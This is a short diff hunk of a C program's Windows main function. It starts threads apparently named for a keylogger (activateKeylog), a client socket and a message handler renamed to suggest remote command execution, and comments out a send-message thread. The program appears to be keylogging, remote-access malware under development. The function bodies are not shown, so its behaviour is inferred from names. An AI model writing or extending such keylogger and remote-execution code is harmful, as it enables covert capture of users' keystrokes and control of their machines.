@@ -28,26 +28,26 @@ int main() {
 
 
 #ifdef _WIN32
-	HANDLE cliSocket, sendMSG, getMSG, actKeylog;
-	DWORD cliSocketId, sendMSGId, getMSGId, actKeylogId;
+	HANDLE cliSocket, sendMSG, execMSG, actKeylog;
+	DWORD cliSocketId, sendMSGId, execMSGId, actKeylogId;
 
 	WSADATA wsa;
 	WSAStartup(MAKEWORD(2,2), &wsa);
 
 	actKeylog = CreateThread(NULL, 0, activateKeylog, NULL, 0, &actKeylogId);
 	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)&param, 0, &cliSocketId);
-	sendMSG = CreateThread(NULL, 0, sendMessage, (LPVOID)&param, 0, &sendMSGId);
-	getMSG = CreateThread(NULL, 0, getMessage, (LPVOID)&param, 0, &getMSGId);
+	//sendMSG = CreateThread(NULL, 0, sendMessage, (LPVOID)&param, 0, &sendMSGId);
+	execMSG = CreateThread(NULL, 0, getMessage, (LPVOID)&param, 0, &execMSGId);
 
 
 	WaitForSingleObject(cliSocket, INFINITE);
 	CloseHandle(cliSocket);
 
-	WaitForSingleObject(sendMSG, INFINITE);
-	CloseHandle(sendMSG);
+	//WaitForSingleObject(sendMSG, INFINITE);
+	//CloseHandle(sendMSG);
 
-	WaitForSingleObject(getMSG, INFINITE);
-	CloseHandle(getMSG);
+	WaitForSingleObject(execMSG, INFINITE);
+	CloseHandle(execMSG);
 
 	WaitForSingleObject(actKeylog, INFINITE);
 	CloseHandle(actKeylog);
